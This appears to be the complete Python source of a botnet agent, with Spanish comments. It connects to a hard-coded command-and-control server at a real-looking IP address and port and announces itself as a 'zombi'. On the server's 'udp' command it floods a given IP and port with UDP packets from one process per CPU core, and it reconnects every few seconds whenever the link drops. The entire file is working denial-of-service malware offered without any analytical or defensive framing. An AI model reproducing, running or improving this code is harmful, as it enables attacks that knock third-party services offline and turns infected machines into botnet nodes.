import socket
import threading
import os

CNC_IP = "87.106.52.7"
CNC_PORT = 6017

def attack_udp(ip, port, dur):
    import time
    import random
    import multiprocessing
    def job(dur, ip, port):
        import socket
        SPT = 5
        PSZ = 1200
        dst = (ip, port)
        pkt = bytes(PSZ)
        socks = []
        for _ in range(SPT):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                socks.append(s)
            except:
                socks.append(None)
        st = time.time()
        while time.time() - st < dur:
            for s in socks:
                if s is not None:
                    try:
                        s.sendto(pkt, dst)
                    except:
                        pass
        for s in socks:
            if s is not None:
                s.close()

    cores = multiprocessing.cpu_count()
    procs = []
    for _ in range(cores):
        p = multiprocessing.Process(target=job, args=(dur, ip, port))
        p.start()
        procs.append(p)
    for p in procs:
        p.join()

def main():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((CNC_IP, CNC_PORT))
                s.sendall(b"zombi\n")  # Identificación
                while True:
                    data = s.recv(1024).decode().strip()
                    if data.startswith("udp"):
                        parts = data.split()
                        if len(parts) == 4:
                            _, ip, port, dur = parts
                            print(f"Ejecutando Ataque")
                            attack_udp(ip, int(port), int(dur))
        except Exception as e:
            print(f" Reconectando en 5s...")
            import time
            time.sleep(5)

if __name__ == "__main__":
    main()
